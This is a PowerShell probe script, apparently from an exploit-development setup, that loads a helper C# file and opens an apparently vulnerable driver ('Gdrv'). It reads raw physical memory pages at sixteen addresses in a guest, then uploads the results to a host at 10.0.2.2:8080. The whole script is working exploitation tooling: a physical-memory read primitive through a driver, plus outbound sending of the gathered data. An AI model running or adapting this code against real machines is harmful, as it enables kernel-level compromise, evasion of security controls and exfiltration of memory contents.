# probeD.ps1 - map which PA ranges the driver can actually read in this guest
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d = $PSScriptRoot
$log = New-Object System.Collections.ArrayList
function L([string]$s) { $log.Add($s) | Out-Null }
try { Add-Type -Path (Join-Path $d 'p37_prov.cs') } catch { L ('COMPILE FAIL ' + $_.Exception.Message); $log -join "`r`n" | Set-Content "$d\probeD.out"; exit 1 }
$g = [IntPtr]::Zero
$e = [P37Prov]::GdrvOpen([ref]$g)
L ('open=' + $e)
if ($e -ne '') { $log -join "`r`n" | Set-Content "$d\probeD.out"; exit 1 }

function T([uint64]$pa) {
    $sw = [Diagnostics.Stopwatch]::StartNew()
    try {
        $b = [P37Prov]::GdrvReadOneRaw($g, $pa, 0x1000)
        $nz = 0; for ($i = 0; $i -lt 4096; $i++) { if ($b[$i] -ne 0) { $nz++ } }
        L ('pa=0x{0:x} ok nz={1} ms={2} head={3}' -f $pa, $nz, $sw.ElapsedMilliseconds, [P37Prov]::Hex($b[0..7]))
    } catch { L ('pa=0x{0:x} ERR ms={1} {2}' -f $pa, $sw.ElapsedMilliseconds, $_.Exception.Message) }
}
T 0x1000
T 0x100000
T 0x4000000
T 0x8000000
T 0x10000000
T 0x20000000
T 0x30000000
T 0x3FF00000
T 0x40000000
T 0x40001000
T 0x50000000
T 0x60000000
T 0x80000000
T 0xA0000000
T 0xC0000000
T 0xE0000000
$body = $log -join "`r`n"
Set-Content -LiteralPath "$d\probeD.out" -Value $body
$tag = 'x'
try { $tag = (New-Object Net.WebClient).DownloadString("$base/active.txt").Trim() } catch { }
try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## probeD`r`n" + $body)) } catch { }
